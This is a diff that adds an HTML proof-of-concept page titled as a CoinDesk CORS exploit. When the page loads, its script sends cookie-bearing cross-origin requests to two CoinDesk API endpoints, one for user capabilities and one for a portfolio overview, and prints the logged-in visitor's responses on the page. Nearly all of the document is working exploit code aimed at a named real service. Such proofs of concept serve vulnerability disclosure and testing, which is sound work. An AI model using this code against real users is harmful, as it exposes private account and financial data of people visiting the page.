@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CoinDesk CORS Exploit POC</title>
+</head>
+<body>
+    <h1>CoinDesk CORS Vulnerability POC</h1>
+    <div id="result"></div>
+    
+    <script>
+        // This POC demonstrates that any website can access authenticated CoinDesk endpoints
+        // when a user visits while logged into CoinDesk
+        
+        async function exploitCORS() {
+            const endpoints = [
+                'https://www.coindesk.com/api/v1/user/capabilities',
+                'https://www.coindesk.com/api/v4/portfolio/overview?tradingAccountId=1'
+            ];
+            
+            for (const endpoint of endpoints) {
+                try {
+                    console.log(`Testing: ${endpoint}`);
+                    const response = await fetch(endpoint, {
+                        method: 'GET',
+                        credentials: 'include',  // Sends cookies if user is logged in
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'Accept': 'application/json'
+                        }
+                    });
+                    
+                    const data = await response.text();
+                    document.getElementById('result').innerHTML += 
+                        `<h3>${endpoint}</h3><pre>Status: ${response.status}</pre>` +
+                        `<pre>Response: ${data.substring(0, 500)}...</pre><hr>`;
+                    
+                    console.log(`Response from ${endpoint}:`, data.substring(0, 200));
+                    
+                } catch (error) {
+                    console.error(`Error with ${endpoint}:`, error);
+                    document.getElementById('result').innerHTML += 
+                        `<h3>${endpoint} - ERROR</h3><pre>${error}</pre><hr>`;
+                }
+            }
+        }
+        
+        exploitCORS();
+    </script>
+</body>
+</html>
